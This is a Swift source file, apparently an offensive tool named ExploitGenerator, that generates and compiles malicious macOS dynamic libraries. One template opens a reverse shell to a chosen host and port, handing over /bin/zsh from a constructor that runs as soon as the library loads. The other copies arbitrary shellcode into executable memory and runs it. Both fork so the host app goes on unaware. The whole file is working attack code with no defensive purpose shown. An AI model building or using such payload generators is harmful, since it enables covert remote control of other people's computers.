import Foundation

class ExploitGenerator {
    
    enum PayloadType {
        case reverseShell(host: String, port: Int)
        case rawShellcode(url: URL)
    }
    
    static func generate(type: PayloadType, outputURL: URL) -> Bool {
        var cCode = ""
        
        switch type {
        case .reverseShell(let host, let port):
            cCode = generateRevShellC(host: host, port: port)
        case .rawShellcode(let url):
            guard let shellcodeData = try? Data(contentsOf: url) else {
                print("Error: Could not read shellcode file at \(url.path)")
                return false
            }
            cCode = generateLoaderC(shellcode: shellcodeData)
        }
        
        // Write C file
        let cPath = outputURL.deletingPathExtension().appendingPathExtension("c")
        do {
            try cCode.write(to: cPath, atomically: true, encoding: .utf8)
            print("Generated C source: \(cPath.path)")
        } catch {
            print("Error writing C source: \(error)")
            return false
        }
        
        // Compile using clang
        // clang -dynamiclib -o <output> <source>
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/env")
        process.arguments = ["clang", "-dynamiclib", "-o", outputURL.path, cPath.path]
        
        // Capture output
        let pipe = Pipe()
        process.standardOutput = pipe
        process.standardError = pipe
        
        do {
            try process.run()
            process.waitUntilExit()
            
            if process.terminationStatus == 0 {
                print("Successfully compiled dylib: \(outputURL.path)")
                // Optionally clean up C file
                // try? FileManager.default.removeItem(at: cPath)
                return true
            } else {
                let data = pipe.fileHandleForReading.readDataToEndOfFile()
                if let output = String(data: data, encoding: .utf8) {
                    print("Compilation failed:\n\(output)")
                }
                return false
            }
        } catch {
            print("Error running clang: \(error)")
            // Fallback: Just tell user how to compile
            print("Could not run clang. Compile manually with:")
            print("clang -dynamiclib -o \(outputURL.lastPathComponent) \(cPath.lastPathComponent)")
            return false
        }
    }
    
    static func generateRevShellC(host: String, port: Int) -> String {
        return """
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>

__attribute__((constructor))
void my_constructor(void) {
    int pid = fork();
    if (pid > 0) {
        // Parent returns immediately to let host app continue
        return;
    }
    if (pid == 0) {
        // Child process - exploit
        // Detach?
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(\(port));
        inet_pton(AF_INET, "\(host)", &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            execve("/bin/zsh", NULL, NULL);
        }
        exit(0);
    }
}
"""
    }
    
    static func generateLoaderC(shellcode: Data) -> String {
        let bytes = shellcode.map { String(format: "0x%02x", $0) }.joined(separator: ", ")
        
        return """
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

unsigned char shellcode[] = { \(bytes) };

__attribute__((constructor))
void my_constructor(void) {
    // Fork to avoid crashing the main app if shellcode is blocking
    int pid = fork();
    if (pid > 0) return;
    
    if (pid == 0) {
        void *ptr = mmap(0, sizeof(shellcode), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
        if (ptr == MAP_FAILED) {
            exit(1);
        }
        memcpy(ptr, shellcode, sizeof(shellcode));
        void (*sc)(void) = ptr;
        sc();
        exit(0);
    }
}
"""
    }
}
